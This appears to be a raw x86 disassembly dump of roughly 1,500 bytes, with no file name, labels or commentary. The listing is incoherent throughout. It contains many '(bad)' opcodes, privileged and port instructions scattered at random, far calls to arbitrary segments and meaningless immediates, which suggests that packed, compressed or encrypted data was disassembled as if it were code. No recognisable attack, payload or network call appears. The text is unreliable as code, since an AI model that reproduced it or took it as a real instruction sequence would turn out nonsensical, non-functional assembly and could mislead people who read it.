  4189de:	jo     0x4189f9
  4189e0:	dec    ecx
  4189e1:	push   esi
  4189e2:	sbb    DWORD PTR [ebp-0x48750d70],0xffffffa2
  4189e9:	enter  0xea90,0xa4
  4189ed:	ja     0x4189f1
  4189ef:	loope  0x4189f1
  4189f1:	add    esp,eax
  4189f3:	out    dx,al
  4189f4:	and    edi,DWORD PTR gs:[edi+0x70]
  4189f8:	fwait
  4189f9:	mov    al,BYTE PTR [edi]
  4189fb:	mov    ebp,0x35c9c626
  418a00:	imul   ecx,DWORD PTR [esi],0xffffffd7
  418a03:	ins    DWORD PTR es:[edi],dx
  418a04:	push   ebx
  418a05:	fldcw  WORD PTR [ebx+0x409eeb51]
  418a0b:	popa   
  418a0c:	xchg   ecx,eax
  418a0d:	pop    esi
  418a0e:	fwait
  418a0f:	retf   
  418a10:	mov    edi,0x18933f88
  418a15:	leave  
  418a16:	adc    esi,DWORD PTR [esi-0x1da1113f]
  418a1c:	shl    BYTE PTR [ebp-0x457ed6b7],cl
  418a22:	and    ebp,DWORD PTR [ebp-0x597da58e]
  418a28:	leave  
  418a29:	imul   ebp,ebp,0xaa288b80
  418a2f:	sti    
  418a30:	sbb    DWORD PTR [ecx+0xc],esp
  418a33:	repnz adc BYTE PTR [ecx-0x40aa4b37],ch
  418a3a:	xchg   ebp,eax
  418a3b:	pop    ecx
  418a3c:	adc    DWORD PTR [esi-0x529d0d36],0x22
  418a43:	fisubr DWORD PTR [edi+edx*2+0x2bfd74d8]
  418a4a:	sahf   
  418a4b:	(bad)  
  418a4c:	jmp    0xa33116be
  418a51:	fmulp  st(2),st
  418a53:	mov    cr4,edi
  418a56:	xchg   DWORD PTR [edx+0x3f],esi
  418a59:	mov    bh,0xc1
  418a5b:	retf   0x2e62
  418a5e:	inc    eax
  418a5f:	add    BYTE PTR [edi+0x11],ch
  418a62:	(bad)  
  418a63:	int    0x8b
  418a65:	imul   BYTE PTR [ebp-0x4d2466f6]
  418a6b:	mov    eax,ds:0x1d901637
  418a70:	out    dx,al
  418a71:	xor    BYTE PTR [ecx+0x1],0x44
  418a75:	stc    
  418a76:	pop    eax
  418a77:	loope  0x418a23
  418a79:	fisttp QWORD PTR [ebx+0x76580861]
  418a7f:	enter  0x8146,0xdc
  418a83:	ror    esp,0xc5
  418a86:	sub    ch,BYTE PTR [esi]
  418a88:	ins    BYTE PTR es:[edi],dx
  418a89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a8b:	mov    cl,0x7
  418a8e:	in     eax,0x13
  418a90:	ja     0x418abc
  418a92:	nop
  418a93:	or     esi,DWORD PTR [edi-0x4e3fdb8d]
  418a99:	or     ecx,DWORD PTR [ecx+0x49c39ab2]
  418a9f:	inc    edi
  418aa0:	mov    edi,0xd62288f1
  418aa5:	xor    DWORD PTR [ebx],esp
  418aa7:	push   eax
  418aa8:	mov    ds:0x1615bd93,eax
  418aad:	xchg   esp,eax
  418aae:	les    edi,FWORD PTR [ecx+0x40]
  418ab1:	push   esi
  418ab2:	retf   0xfd6c
  418ab5:	iret   
  418ab6:	mov    BYTE PTR [edx-0x5c],bh
  418ab9:	xchg   esp,eax
  418aba:	dec    edx
  418abb:	pop    ss
  418abc:	or     ecx,DWORD PTR [ebp+edx*4+0x16]
  418ac0:	jne    0x418a94
  418ac2:	pop    ds
  418ac3:	sub    ch,BYTE PTR [edi]
  418ac5:	sbb    BYTE PTR [edi+eax*2+0x2e8b551c],al
  418acc:	or     dl,BYTE PTR [eax]
  418ace:	push   es
  418acf:	fldenv [ebx-0x9]
  418ad2:	(bad)  
  418ad3:	inc    edx
  418ad4:	loope  0x418adc
  418ad6:	xchg   ebx,eax
  418ad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ad8:	push   es
  418ad9:	ficomp WORD PTR [esi]
  418adb:	inc    eax
  418adc:	cmp    DWORD PTR [edi-0x2a],ecx
  418adf:	mov    cl,0xdc
  418ae1:	and    eax,0x50471b04
  418ae6:	xlat   BYTE PTR ds:[ebx]
  418ae7:	leave  
  418ae8:	cli    
  418ae9:	aam    0xaa
  418aeb:	xor    BYTE PTR [edx+0x4a9a4266],dl
  418af1:	pop    edi
  418af2:	cmp    al,0x65
  418af4:	jno    0x418b13
  418af6:	xchg   DWORD PTR [esi-0x7d7ed362],esi
  418afc:	mov    edx,0xf93f310
  418b01:	jnp    0x418a8d
  418b03:	cmp    eax,0x7eebc1a9
  418b08:	sub    BYTE PTR ds:0x60f458ad,cl
  418b0e:	pusha  
  418b0f:	jbe    0x418b30
  418b11:	iret   
  418b12:	bound  ebx,QWORD PTR [ecx-0x72]
  418b15:	mov    ah,ah
  418b17:	ins    BYTE PTR es:[edi],dx
  418b18:	push   ecx
  418b19:	lock xor DWORD PTR [eax],edx
  418b1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b1d:	lahf   
  418b1e:	enter  0xdf0f,0xfb
  418b22:	push   edx
  418b23:	xor    eax,0xb9aa2f5b
  418b28:	mov    WORD PTR [edx+0x41],?
  418b2b:	sbb    cl,BYTE PTR [ebp-0x17c41135]
  418b31:	pop    esp
  418b32:	leave  
  418b33:	xchg   DWORD PTR [ecx-0xe],edi
  418b36:	jp     0x418b6f
  418b38:	mov    ds:0xe996ccf2,eax
  418b3d:	pop    esp
  418b3e:	sub    eax,DWORD PTR [edi+0x23]
  418b41:	out    dx,al
  418b42:	inc    ebx
  418b43:	out    0x15,al
  418b45:	jg     0x418b94
  418b47:	out    dx,al
  418b48:	rol    BYTE PTR gs:[ebx-0x6e76bf4a],cl
  418b4f:	dec    eax
  418b50:	xor    bh,BYTE PTR [edx+ecx*4+0x15]
  418b54:	popf   
  418b55:	push   ebp
  418b56:	sahf   
  418b57:	push   ecx
  418b58:	fnstsw WORD PTR [ebp+0x6]
  418b5b:	es mov ecx,0xc0c7bf75
  418b61:	jg     0x418b9a
  418b63:	mov    bl,0x4b
  418b65:	add    al,0x98
  418b67:	jnp    0x418b88
  418b69:	cmp    al,0x8a
  418b6b:	fyl2xp1 
  418b6d:	int    0x1f
  418b6f:	ror    BYTE PTR [eax],1
  418b71:	cwde   
  418b72:	fld    TBYTE PTR [esi+0x21a44fe4]
  418b78:	(bad)  
  418b79:	js     0x418b4f
  418b7b:	clc    
  418b7c:	xor    eax,0x5cf3a9f6
  418b81:	fsubr  st(5),st
  418b83:	sub    eax,0xcbcf456b
  418b88:	mov    DWORD PTR [eax-0x6a],eax
  418b8b:	jl     0x418b2d
  418b8d:	adc    DWORD PTR [edi+0x21d327f7],ebx
  418b93:	mov    ds:0x95e5c63,eax
  418b98:	ins    DWORD PTR es:[edi],dx
  418b99:	jg     0x418bb2
  418b9b:	mov    ebp,0x3668ebeb
  418ba0:	sahf   
  418ba1:	and    ch,BYTE PTR [edi*8+0x8fd26f4]
  418ba8:	js     0x418c0a
  418baa:	lods   al,BYTE PTR ds:[esi]
  418bab:	sbb    DWORD PTR [ecx*4-0x75c4600c],ecx
  418bb2:	in     eax,dx
  418bb3:	test   al,0xc7
  418bb5:	jecxz  0x418b93
  418bb7:	popa   
  418bb8:	std    
  418bb9:	xor    DWORD PTR [esi],ebx
  418bbb:	cld    
  418bbc:	aas    
  418bbd:	pop    ss
  418bbe:	call   0xf081a784
  418bc3:	jnp    0x418b5a
  418bc5:	mov    gs,WORD PTR [edx-0x6e72266e]
  418bcb:	or     dh,cl
  418bcd:	mov    cl,0xca
  418bcf:	jmp    0x418b6c
  418bd1:	xor    al,0x7b
  418bd3:	xor    esp,DWORD PTR [ebx+0x12]
  418bd6:	shr    DWORD PTR [edi-0x76aeeb6a],cl
  418bdc:	xchg   esi,eax
  418bdd:	dec    ebx
  418bde:	dec    eax
  418bdf:	mov    bh,0x8
  418be1:	mov    ebx,0x94a9cd5f
  418be6:	xor    eax,0x2debd263
  418beb:	out    dx,eax
  418bec:	test   ch,bh
  418bee:	jnp    0x418c13
  418bf0:	mov    al,ds:0xd5445274
  418bf5:	fidivr DWORD PTR [edi]
  418bf7:	pop    edx
  418bf8:	sti    
  418bf9:	call   0xa8e6:0x7b4dfcee
  418c00:	mov    al,ds:0x9cbc8681
  418c05:	push   ds
  418c06:	jmp    0xabf7ca63
  418c0b:	mov    ch,0xa4
  418c0d:	addr16 jb 0x418c8b
  418c10:	adc    dl,BYTE PTR [ebx-0x3db78399]
  418c16:	lock or BYTE PTR [edx-0x67],cl
  418c1a:	int3   
  418c1b:	nop
  418c1c:	cmp    DWORD PTR [edi],esi
  418c1e:	call   0xa0c6:0x2081f3ee
  418c25:	and    al,BYTE PTR [ecx+0x28]
  418c28:	pushf  
  418c29:	loopne 0x418c69
  418c2b:	dec    esp
  418c2c:	call   ecx
  418c2e:	fisubr DWORD PTR [ebx+0x14]
  418c31:	pop    eax
  418c32:	push   eax
  418c33:	test   DWORD PTR [ebp-0x48],ebx
  418c36:	push   ss
  418c37:	sub    al,0x98
  418c39:	pop    esp
  418c3a:	push   ss
  418c3b:	imul   eax,edx,0xffffff87
  418c3e:	or     BYTE PTR [eax],dh
  418c40:	cmc    
  418c41:	push   esi
  418c42:	in     al,0x4b
  418c44:	push   0x5d
  418c46:	jo     0x418c83
  418c48:	rcr    DWORD PTR [edx-0x58cbc214],cl
  418c4e:	dec    edx
  418c4f:	stos   BYTE PTR es:[edi],al
  418c50:	dec    edi
  418c51:	jmp    0x26df7834
  418c56:	xchg   ecx,eax
  418c57:	adc    ah,cl
  418c59:	out    0xaa,al
  418c5b:	pusha  
  418c5c:	cmp    eax,0x7355221
  418c61:	and    bl,BYTE PTR [ebx]
  418c63:	sbb    al,BYTE PTR [ecx+0x57a6d97a]
  418c69:	gs pop esi
  418c6b:	gs nop
  418c6d:	sub    al,0x64
  418c6f:	test   BYTE PTR [eax],dh
  418c71:	jns    0x418ca8
  418c73:	les    edi,FWORD PTR [edi+0x1d87a82e]
  418c79:	stos   BYTE PTR es:[edi],al
  418c7a:	cmp    dh,al
  418c7c:	rol    BYTE PTR [ecx+eax*2-0x7c42b83c],1
  418c83:	fmul   QWORD PTR [edi]
  418c85:	ja     0x418ce3
  418c87:	into   
  418c88:	sbb    eax,0x44996929
  418c8d:	dec    ecx
  418c8e:	cs inc edx
  418c90:	and    al,0x3c
  418c92:	je     0x418c5d
  418c94:	scas   eax,DWORD PTR es:[edi]
  418c95:	sbb    BYTE PTR [esi],dl
  418c97:	(bad)  
  418c98:	adc    eax,0xbcb56cdd
  418c9d:	xchg   esi,eax
  418c9e:	imul   ebp,edi,0x3c
  418ca1:	loopne 0x418d1d
  418ca3:	cmp    eax,0x480fdea
  418ca8:	imul   esi,DWORD PTR ds:0xe9da3e65,0xffffffee
  418caf:	push   0xf2b5e8b
  418cb4:	cli    
  418cb5:	in     eax,0xa3
  418cb7:	test   DWORD PTR [eax+0x48],0x763d2b24
  418cbe:	xchg   esi,eax
  418cbf:	hlt    
  418cc0:	xchg   ecx,eax
  418cc1:	push   edi
  418cc2:	in     eax,0x35
  418cc4:	mov    dl,BYTE PTR [esi]
  418cc6:	in     al,0x3c
  418cc8:	test   DWORD PTR [edi+0xe],ebx
  418ccb:	push   edx
  418ccc:	ret    
  418ccd:	retf   
  418cce:	fsubr  DWORD PTR [ecx]
  418cd0:	mov    ds:0x5ae8f727,eax
  418cd5:	fild   QWORD PTR [edx-0x58]
  418cd8:	add    bl,0xa5
  418cdb:	add    dh,BYTE PTR [ecx+eax*1]
  418cde:	imul   edx,DWORD PTR [edi+0x70],0x73
  418ce2:	xchg   ebp,eax
  418ce3:	push   DWORD PTR [ecx-0xb]
  418ce6:	imul   ebx,DWORD PTR [eax+0xd62aeae],0x3bf82433
  418cf0:	mov    ds:0xd52cd7eb,eax
  418cf5:	xor    eax,0x23df6719
  418cfa:	cmp    ecx,DWORD PTR [edx-0x5d6207ea]
  418d00:	call   0x59d9:0x16266ec4
  418d07:	inc    esp
  418d08:	xlat   BYTE PTR ds:[ebx]
  418d09:	adc    DWORD PTR [ebp-0x4b],edx
  418d0c:	pop    ebx
  418d0d:	or     ch,BYTE PTR [ebp-0x46bf457a]
  418d13:	push   es
  418d14:	aaa    
  418d15:	retf   
  418d16:	imul   ebp,DWORD PTR [eax-0x727a0956],0x58f1bb62
  418d20:	xor    eax,0xf507102f
  418d25:	add    dh,ch
  418d27:	dec    ebx
  418d28:	push   ebx
  418d29:	dec    ebp
  418d2a:	dec    ecx
  418d2b:	nop
  418d2c:	push   0xfffffffa
  418d2e:	dec    edi
  418d2f:	frstor [edx]
  418d31:	rol    cl,cl
  418d33:	mov    WORD PTR [ebp+0x3d],ss
  418d36:	jge    0x418cec
  418d38:	mov    ds:0x7d870e40,eax
  418d3d:	(bad)  
  418d3f:	sbb    DWORD PTR [ebp-0x3f],eax
  418d42:	outs   dx,BYTE PTR ds:[esi]
  418d43:	mov    esp,0xa9491203
  418d48:	outs   dx,DWORD PTR ds:[esi]
  418d49:	or     eax,0x8d2d51d0
  418d4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d4f:	cmp    eax,0x85bbc184
  418d54:	mov    ds:0x6215fb18,eax
  418d59:	test   al,0xb0
  418d5b:	cmc    
  418d5c:	or     al,BYTE PTR [eax+0x52f2dbf8]
  418d62:	lahf   
  418d63:	(bad)  
  418d64:	jnp    0x418d92
  418d66:	call   DWORD PTR [ecx]
  418d68:	repnz lea esp,ds:0x3a0b795c
  418d6f:	mov    eax,0x2870f567
  418d74:	and    ebp,DWORD PTR [edi+ecx*8]
  418d77:	push   ss
  418d78:	jne    0x418d25
  418d7a:	cmp    edx,eax
  418d7c:	(bad)  
  418d7d:	or     BYTE PTR [edi+edi*4],dl
  418d80:	scas   al,BYTE PTR es:[edi]
  418d81:	cli    
  418d82:	and    bh,BYTE PTR [eax+edx*2+0x43987ef]
  418d89:	ret    
  418d8a:	sub    bl,BYTE PTR [edx+0x6aa1f408]
  418d90:	mov    bh,0x2e
  418d92:	mov    ds:0xd2ee1733,eax
  418d97:	and    bh,BYTE PTR [edi-0x742f5af4]
  418d9d:	(bad)  
  418d9e:	cli    
  418d9f:	jmp    0xc8c63eee
  418da4:	(bad)  
  418da5:	(bad)  
  418da6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418da7:	ss das 
  418da9:	adc    BYTE PTR [edi+0x16],ah
  418dac:	mov    ds:0xb1c3db7d,eax
  418db1:	mov    eax,ebx
  418db3:	loop   0x418e16
  418db5:	repz out 0x5b,al
  418db8:	adc    BYTE PTR [edx+0x4ac0e9aa],dh
  418dbe:	cmp    al,0x9
  418dc0:	(bad)  
  418dc1:	shl    DWORD PTR [eax-0x60],1
  418dc4:	xor    ebp,DWORD PTR [edi]
  418dc6:	ins    DWORD PTR es:[edi],dx
  418dc7:	pusha  
  418dc8:	push   es
  418dc9:	out    0x85,eax
  418dcb:	out    0xf3,eax
  418dcd:	and    bh,BYTE PTR [eiz*2-0x68bcda14]
  418dd4:	mov    al,ds:0x421622ca
  418dd9:	out    0xb,al
  418ddb:	xchg   esp,eax
  418ddc:	sbb    ch,dl
  418dde:	push   esi
  418ddf:	inc    esi
  418de0:	stc    
  418de1:	rol    DWORD PTR [edx],0x20
  418de4:	jb     0x418e0d
  418de6:	pop    edi
  418de7:	cs sub al,0xe7
  418dea:	bound  edx,QWORD PTR [eax-0x17]
  418ded:	sbb    DWORD PTR [ecx+0x6d],0x210ff450
  418df4:	scas   eax,DWORD PTR es:[edi]
  418df5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418df6:	ss test eax,0xb8263a04
  418dfc:	sahf   
  418dfd:	xor    esp,DWORD PTR [edi-0x5f7bba4c]
  418e03:	clc    
  418e04:	or     cl,BYTE PTR ds:0xa21fc5ff
  418e0a:	(bad)  
  418e0b:	(bad)  
  418e0c:	sub    DWORD PTR [si-0x476a],eax
  418e11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e12:	(bad)  
  418e13:	or     eax,eax
  418e15:	mov    ds:0x2f0e486e,eax
  418e1a:	push   esi
  418e1b:	out    0x3d,eax
  418e1d:	(bad)
  418e20:	ret    
  418e21:	pushf  
  418e22:	push   0x54
  418e24:	inc    edi
  418e25:	mov    esp,0x1133f1d2
  418e2a:	jno    0x418dc2
  418e2c:	xor    BYTE PTR [ebx*2+0x6d5ce32e],0x29
  418e34:	cs cld 
  418e36:	mov    ?,esi
  418e38:	pushf  
  418e39:	inc    edx
  418e3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e3c:	pop    esi
  418e3d:	cmp    eax,0x3c048872
  418e42:	ins    BYTE PTR es:[edi],dx
  418e43:	fmulp  st(7),st
  418e45:	xchg   edi,eax
  418e46:	cdq    
  418e47:	addr16 and eax,0x88a09c66
  418e4d:	js     0x418eb3
  418e4f:	test   BYTE PTR [esi-0x7c],dl
  418e52:	jle    0x418df1
  418e54:	arpl   WORD PTR [esi+0x757f037a],bp
  418e5a:	aad    0x57
  418e5c:	xchg   ebp,eax
  418e5d:	sub    DWORD PTR [esp-0x68],ecx
  418e61:	lods   al,BYTE PTR ds:[esi]
  418e62:	je     0x418e8d
  418e64:	sbb    bl,bl
  418e66:	or     ebx,ebp
  418e68:	loope  0x418e83
  418e6a:	push   ebp
  418e6b:	add    DWORD PTR [esi+0x1],esp
  418e6e:	sti    
  418e6f:	les    ebx,FWORD PTR [esi+0x1fac969c]
  418e75:	dec    esi
  418e76:	aaa    
  418e77:	xchg   BYTE PTR [edi],bh
  418e79:	inc    esp
  418e7a:	daa    
  418e7b:	pop    ebp
  418e7c:	mov    BYTE PTR [esi-0x16],dl
  418e7f:	imul   ebp,esp,0x872e617c
  418e85:	ins    WORD PTR es:[edi],dx
  418e87:	lods   al,BYTE PTR ds:[esi]
  418e88:	pop    edi
  418e89:	call   0x4ef8:0x4560b1f7
  418e90:	inc    edx
  418e91:	pushf  
  418e92:	push   ebp
  418e93:	push   eax
  418e94:	int3   
  418e95:	fbstp  TBYTE PTR [edx+0x6c]
  418e98:	sbb    eax,ebx
  418e9a:	inc    ecx
  418e9b:	dec    esp
  418e9c:	add    dh,BYTE PTR [ebx+0x18f51221]
  418ea2:	fsubr  DWORD PTR [esp+ebp*4+0x39]
  418ea6:	js     0x418eba
  418ea8:	(bad)  
  418ea9:	sbb    dl,BYTE PTR [esi]
  418eab:	xchg   esp,eax
  418eac:	addr16 es cs out 0x4a,eax
  418eb1:	push   edx
  418eb2:	dec    edx
  418eb3:	jb     0x418eeb
  418eb5:	ret    
  418eb6:	test   ebp,ebp
  418eb8:	jle    0x418ea0
  418eba:	sbb    al,0x70
  418ebc:	and    DWORD PTR [eax+esi*2-0x52],0x3d3c598
  418ec4:	cmp    eax,DWORD PTR [ecx+esi*2]
  418ec7:	mov    ch,0xa0
  418ec9:	ds in  eax,0x55
  418ecc:	fs dec ebx
  418ece:	fs push ecx
  418ed0:	and    DWORD PTR [ecx+0x57],esi
  418ed3:	shr    ebx,0x9
  418ed6:	(bad)  
  418ed7:	jle    0x418eeb
  418ed9:	ss jle 0x418f2e
  418edc:	sti    
  418edd:	outs   dx,BYTE PTR ds:[esi]
  418ede:	mov    edi,0x4febcbe1
  418ee3:	push   cs
  418ee4:	mov    BYTE PTR [ebx-0x51b12a6a],ch
  418eea:	das    
  418eeb:	ins    BYTE PTR es:[edi],dx
  418eec:	xor    eax,0x6429cb97
  418ef1:	scas   al,BYTE PTR es:[edi]
  418ef2:	out    dx,al
  418ef3:	mov    al,ds:0xb144566a
  418ef8:	mov    ah,0x98
  418efa:	jecxz  0x418f4f
  418efc:	or     DWORD PTR [ecx-0x770199fb],0x6
  418f03:	sbb    ebx,DWORD PTR [eax+0x31]
  418f06:	dec    edi
  418f07:	mov    DWORD PTR [ecx],edx
  418f09:	jecxz  0x418ee4
  418f0b:	test   eax,0x537a89e4
  418f10:	mov    ah,0xa9
  418f12:	lods   eax,DWORD PTR ds:[esi]
  418f13:	jnp    0x418ef9
  418f15:	sbb    DWORD PTR cs:[ebx],esp
  418f18:	and    al,0x56
  418f1a:	xchg   bh,bl
  418f1c:	push   0xffffffac
  418f1e:	sbb    eax,DWORD PTR [edi+0xf0119ad]
  418f24:	pop    ss
  418f25:	gs mov esp,0x2c10090f
  418f2b:	dec    eax
  418f2c:	dec    esi
  418f2d:	iret   
  418f2e:	lock sub al,0xdf
  418f31:	pop    ebx
  418f32:	mov    ch,0x4a
  418f34:	test   eax,0x6132a65b
  418f39:	lds    esp,FWORD PTR [ebp+ecx*1+0x3a]
  418f3d:	mov    ds:0xa5688ce4,eax
  418f42:	jl     0x418fa4
  418f44:	(bad)  [ecx]
  418f46:	std    
  418f47:	das    
  418f48:	pop    ebx
  418f49:	mov    esi,0x1dd6724e
  418f4e:	ins    BYTE PTR es:[edi],dx
  418f4f:	scas   al,BYTE PTR es:[edi]
  418f50:	enter  0xf97f,0x8f
  418f54:	add    al,0xb4
  418f56:	xchg   ch,cl
  418f58:	fist   DWORD PTR [edi+0x64a9982b]
  418f5e:	add    dh,BYTE PTR [esi+0x8]
  418f61:	push   esi
  418f62:	sbb    dh,BYTE PTR [edx]
  418f64:	js     0x418f96
  418f66:	add    BYTE PTR [ebx-0xd16a4c2],cl
  418f6c:	add    esp,ebp
  418f6e:	mov    esp,0x2bca610d
  418f73:	jmp    0x418f8b
  418f75:	(bad)  
  418f76:	mov    ebp,DWORD PTR [edi]
  418f78:	xlat   BYTE PTR ds:[ebx]
  418f79:	call   0x197a1113
  418f7e:	cwde   
  418f7f:	pop    eax
  418f80:	push   ecx
  418f81:	pop    eax
  418f82:	adc    ebx,DWORD PTR [edi+0x5d]
  418f85:	test   DWORD PTR [edx+0x41],edi
  418f88:	add    BYTE PTR [ebp+0x19],bh
  418f8b:	cmp    ah,BYTE PTR [edi+0x7d8abbdd]
  418f91:	sub    esp,DWORD PTR [ecx+ebx*4]
  418f94:	push   esi
  418f95:	es inc eax
  418f97:	test   DWORD PTR [esi-0x6a],ebp
  418f9a:	ret    0x860e
  418f9d:	mov    ebp,DWORD PTR [ecx]
  418f9f:	loopne 0x418fd4
  418fa1:	ds loop 0x418f29
  418fa4:	and    al,BYTE PTR [eax-0x4162354b]
  418faa:	push   ss
  418fab:	inc    ecx
  418fac:	inc    eax
  418fad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fae:	mov    ds:0x4d178196,eax
  418fb3:	(bad)  
  418fb5:	xchg   ecx,eax
  418fb6:	mov    eax,0x54c89f1e
  418fbb:	pop    esp
  418fbc:	call   0xa4a8d26a
  418fc1:	pop    ecx
  418fc2:	or     al,0xbc
  418fc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fc5:	jo     0x418fc8
  418fc7:	icebp  
  418fc8:	sub    BYTE PTR [ecx],ah
  418fca:	stos   BYTE PTR es:[edi],al
  418fcb:	mov    al,0x60
  418fcd:	(bad)  
  418fce:	js     0x418fea
  418fd0:	imul   eax,esp,0x5d
  418fd3:	xor    DWORD PTR [esi-0x488a6050],edx
  418fd9:	je     0x41901d
  418fdb:	add    DWORD PTR [eax+edi*2-0x1c],eax
  418fdf:	scas   eax,DWORD PTR es:[edi]
  418fe0:	sub    esp,DWORD PTR [eax+0x24]
  418fe3:	mov    bh,0xe1
  418fe5:	inc    ecx
  418fe6:	mov    ds:0x100345df,eax
  418feb:	sbb    ch,BYTE PTR [edi-0x2f]
  418fee:	lock rcl DWORD PTR [ebp-0x57],cl
  418ff2:	add    BYTE PTR [eax+0x25],0x67
  418ff6:	ret    0x73b9
  418ff9:	(bad)  
  418ffa:	jecxz  0x418fce
  418ffc:	pop    eax
  418ffd:	ret    
  418ffe:	stos   BYTE PTR es:[edi],al
  418fff:	push   ax
  419001:	mov    edi,0x1edd3113
  419006:	adc    DWORD PTR ds:0x1cc2b6d7,edx
  41900c:	lods   al,BYTE PTR ds:[esi]
  41900d:	cmc    
  41900e:	xchg   ebx,eax
  41900f:	mov    bh,0xca
  419011:	mov    edx,0x9b769763
  419016:	sub    al,0x44
  419018:	(bad)  
  419019:	or     BYTE PTR [edi],ah
  41901b:	pushf  
  41901c:	pop    ds
  41901d:	(bad)  
  41901e:	call   0x51233eec
  419023:	ficom  DWORD PTR ds:0x3b6c0de3
  419029:	inc    esp
  41902a:	adc    DWORD PTR [ecx],edx
  41902c:	shl    DWORD PTR [eax+0x65],cl
  41902f:	mov    BYTE PTR [edi-0x7c],al
  419032:	xor    esp,DWORD PTR [ecx+0x22f5d1f7]
  419038:	dec    edx
  419039:	test   eax,0xe16b2e8a
  41903e:	jnp    0x4190b5
  419040:	fisttp WORD PTR [edx+0x32386fe5]
  419046:	clc    
  419047:	mov    bl,0x9
  419049:	xchg   DWORD PTR ds:[ecx-0x38],ebp
  41904d:	xor    eax,0x38edd95
  419052:	or     al,0x10
  419054:	into   
  419055:	or     cl,BYTE PTR [edi+edi*8+0x5f]
  419059:	out    dx,al
  41905a:	arpl   WORD PTR [ecx-0x45ba49cb],ax
  419060:	hlt    
  419061:	mov    al,BYTE PTR [ecx+edx*1]
  419064:	unpckhps xmm7,XMMWORD PTR [eax+eiz*4]
  419068:	daa    
  419069:	(bad)  
  41906a:	push   0x42
  41906c:	and    eax,ebp
  41906e:	lods   al,BYTE PTR ds:[esi]
  41906f:	adc    al,0xd1
  419071:	xor    BYTE PTR [edx-0x6656ee04],ch
  419077:	and    BYTE PTR [ebx],ah
  419079:	mov    ah,0x46
  41907b:	test   eax,0x9b968b40
  419080:	adc    edx,DWORD PTR [ecx-0x4a]
  419083:	xor    BYTE PTR ds:0x8087c798,bl
  419089:	add    eax,0xf434a387
  41908e:	xchg   ecx,eax
  41908f:	out    0x67,al
  419091:	popa   
  419092:	inc    ebp
  419093:	inc    esi
  419094:	mov    ebp,0xb1c5aa71
  419099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41909a:	adc    esi,DWORD PTR ds:0x59b1ae60
  4190a0:	ds adc eax,0x6ee65414
  4190a6:	adc    al,0x36
  4190a8:	xor    DWORD PTR ds:0x14b64907,ebx
  4190ae:	(bad)  
  4190af:	in     eax,dx
  4190b0:	cmp    ebx,DWORD PTR [ecx-0x7d]
  4190b3:	jle    0x419116
  4190b5:	mov    bh,0xd8
  4190b7:	or     eax,0x7b582f6f
  4190bc:	inc    edi
  4190be:	adc    dl,0xc
  4190c1:	rcr    edx,0xcb
  4190c4:	loope  0x4190b3
  4190c6:	aad    0xe1
  4190c8:	mov    esi,0x14309109
  4190cd:	into   
  4190ce:	or     eax,0x32a3622c
  4190d3:	in     al,0x23
  4190d5:	inc    esi
  4190d6:	dec    ebp
  4190d7:	ds clc 
  4190d9:	inc    esp
  4190da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190db:	fstp   st(5)
  4190dd:	pop    ecx
  4190de:	jmp    0xdb59:0x1c1c5578
  4190e5:	aaa    
  4190e6:	dec    esp
  4190e7:	enter  0x21ac,0xa7
  4190eb:	call   0x9ebe5fe5
  4190f0:	dec    ebp
  4190f1:	xchg   esp,eax
  4190f2:	push   ds
  4190f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190f4:	cdq    
  4190f5:	std    
  4190f6:	into   
  4190f7:	xor    BYTE PTR [edx-0x1fdea4aa],ch
  4190fd:	dec    esp
  4190fe:	xor    DWORD PTR [esi+0x1d561971],ecx
  419104:	mov    ecx,0x4469a48d
  419109:	imul   ebp,DWORD PTR [edi-0x32],0x88c6b18a
  419110:	lahf   
  419111:	dec    edi
  419112:	mov    bl,0xa6
  419114:	addr16 cli 
  419116:	mov    bh,0xe7
  419118:	push   ebx
  419119:	(bad)  
  41911a:	push   eax
  41911b:	es lock jecxz 0x4190b8
  41911f:	repz out 0x7d,al
  419122:	fiadd  DWORD PTR [ecx-0x1f5878f1]
  419128:	cli    
  419129:	shl    dl,cl
  41912b:	in     al,dx
  41912c:	cmp    al,0xc4
  41912e:	dec    eax
  41912f:	add    ebp,DWORD PTR [ebx+0x79]
  419132:	push   ecx
  419133:	add    BYTE PTR [edx],dl
  419135:	js     0x41914c
  419137:	jnp    0x41911f
  419139:	icebp  
  41913a:	dec    ebp
  41913b:	std    
  41913c:	or     esi,DWORD PTR [ecx-0x7d18ede0]
  419142:	mov    esp,0x3297bac4
  419147:	push   ebx
  419148:	dec    edi
  419149:	sub    bl,dl
  41914b:	jbe    0x4191b6
  41914d:	fidiv  DWORD PTR [eax]
  41914f:	add    bl,BYTE PTR [ecx+0x77]
  419152:	mov    ch,0x95
  419154:	imul   eax,DWORD PTR [ebp-0x7184abaa],0x7c16da83
  41915e:	pop    edx
  41915f:	rcr    BYTE PTR [edi+0x44d2a647],cl
  419165:	test   BYTE PTR [ebp-0x34dcc310],dl
  41916b:	stc    
  41916c:	adc    cl,BYTE PTR [ebx+0x2c976f68]
  419172:	add    al,0xa4
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	cli    
  419176:	jle    0x419145
  419178:	sub    BYTE PTR ds:0xe21581e6,al
  41917e:	jmp    0x9040:0x7e68031f
  419185:	cmp    eax,0xfe841ef7
  41918a:	or     ebp,DWORD PTR [ecx]
  41918c:	mov    ecx,0xe48d53b6
  419191:	pop    eax
  419192:	or     eax,0x2c135551
  419197:	xor    BYTE PTR [esi+0xe],al
  41919a:	imul   ecx,DWORD PTR [esi],0xeed25349
  4191a0:	and    esp,ebp
  4191a2:	sub    DWORD PTR [ebx-0x78c60c49],0x5e
  4191a9:	adc    BYTE PTR [ecx],cl
  4191ab:	les    ebp,FWORD PTR [edi]
